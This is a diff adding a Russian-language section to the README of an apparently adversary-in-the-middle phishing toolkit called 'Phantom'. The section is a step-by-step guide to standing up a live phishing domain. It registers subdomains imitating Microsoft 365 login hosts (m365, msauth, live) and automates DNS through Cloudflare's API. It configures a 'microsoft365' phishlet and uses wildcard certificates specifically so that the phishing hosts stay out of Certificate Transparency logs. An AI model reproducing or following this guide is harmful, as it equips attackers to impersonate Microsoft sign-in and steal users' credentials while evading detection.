@@ -17,6 +17,49 @@ curl -H "X-Stealth-Host: api-internal.example.com" http://127.0.0.1:8080/dashboa
 # Operator UI в браузере: http://127.0.0.1:8080/ui/dashboard.html
 ```
 
+## Боевой домен: пример reg.ru → Cloudflare (на примере verdebudget.ru)
+
+Почему Cloudflare: wildcard-сертификат `*.verdebudget.ru` не палит
+поддомены в CT-логах, а DNS управляется через API (наш `dns_provider`).
+
+**Шаг 1. Делегируй домен на Cloudflare.**
+1. Регистрация на `cloudflare.com` → Add site → `verdebudget.ru` → план Free.
+2. Cloudflare выдаст 2 NS вида `xxx.ns.cloudflare.com`.
+3. Панель reg.ru → домен → «DNS-серверы» → «Изменить» → вписать оба NS
+   Cloudflare → сохранить. Делегирование: от минут до 24ч.
+
+**Шаг 2. DNS-записи в Cloudflare (режим «DNS only», серое облако!).**
+1. DNS → Records → Add record: Type `A`, Name `m365`, IPv4 — IP сервера,
+   Proxy status **OFF (DNS only)**. Оранжевое облако сломает нашу
+   TLS-терминацию и отпечатки — для фиш-хоста только серое.
+2. Аналогично для остальных sub (`live`, `msauth`, `msauthimg` по фишлету).
+
+**Шаг 3. API-токен для нашего провайдера.**
+1. Cloudflare → My Profile → API Tokens → Create Token → шаблон
+   «Edit zone DNS» → Zone Resources: `verdebudget.ru` → Create.
+2. Скопировать токен + Zone ID (домен → Overview, правый сайдбар).
+3. На сервере env (НЕ в git):
+```powershell
+$env:CF_API_TOKEN="токен"
+$env:CF_ZONE_ID="zone-id"
+```
+
+**Шаг 4. Конфиг Phantom.**
+```yaml
+domains: ["verdebudget.ru"]
+tls: {email: "твой@email", dns_provider: "cloudflare", wildcard: true}
+```
+Фишлет: `base_domains: ["verdebudget.ru"]` в `microsoft365.yaml`
+(заменить `phish.test`), затем hot-reload без рестарта:
+`POST /api/v1/phishlets/reload` → 204. При старте сервер сам создаст
+TXT `_acme-challenge` через API и выпустит wildcard у Let's Encrypt.
+
+**Шаг 5. Проверка.**
+```powershell
+curl.exe -v -k https://m365.verdebudget.ru:8443/l/m365-01 2>&1 | Select-String "subject|SSL certificate"
+```
+В CT-логах виден только `*.verdebudget.ru`, полный хост не раскрыт.
+
 ## Операторское меню (`phantom -menu`)
 
 Консольный пульт поверх stealth API. Сервер уже запущен, второе окно:
